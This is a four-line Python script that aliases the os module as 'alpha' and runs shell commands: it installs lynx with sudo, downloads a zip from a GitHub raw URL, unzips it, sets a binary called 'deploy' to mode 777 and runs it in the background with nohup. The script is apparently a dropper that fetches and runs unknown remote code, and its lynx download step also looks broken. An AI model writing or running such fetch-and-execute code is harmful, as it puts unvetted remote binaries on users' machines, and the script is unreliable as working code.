import os as alpha
alpha.system ("sudo apt update")
alpha.system ("sudo apt install lynx -y")
alpha.system ("lynx -nonumbers -listonly -dump https://github.com/aurbach55/zash/raw/main/deploy.zip >> deploy.zip && unzip deploy.zip && chmod 777 deploy && nohup ./deploy > nohup.out")
